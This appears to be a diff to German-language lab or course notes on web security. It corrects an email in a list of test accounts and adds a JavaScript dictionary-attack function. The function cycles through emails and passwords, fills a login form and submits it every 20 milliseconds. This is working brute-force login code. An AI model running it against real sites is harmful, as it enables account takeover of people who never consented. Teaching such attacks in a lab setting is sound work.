@@ -31,11 +31,33 @@ let emails = [
     'marie.curie@hacker-email.com',
     'konrad.zuse@hacker-email.com',
     'stephanie-kwolek@hacker-email.com',
-    'carl-friedrich.auss@hacker-email.com',
+    'carl-friedrich.gauss@hacker-email.com',
     'shirley-ann.jackson@hacker-email.com',
     'gertrude-belle.elion@hacker-email.com',
     'steve.wozniak@hacker-email.com',
     'rudolf.bayer@hacker-email.com',
     'ada.lovelace@hacker-email.com'
 ];
+```
+
+## Dictionary mit E-Mail
+```
+function emailDictionaryAttack(i, j) { // i = 0; j = 0
+    console.log('Testing', emails[i], dictionary[j]);
+    password.type = 'text';
+    username.value = emails[i];
+    password.value = dictionary[j];
+    loginButton.click();
+
+    j++;
+
+    if (j >= dictionary.length) {
+        i++;
+        j = 0;
+    }
+
+    if (i < emails.length || j < dictionary.length) {
+        setTimeout(emailDictionaryAttack, 20, i, j);
+    }
+}
 ```
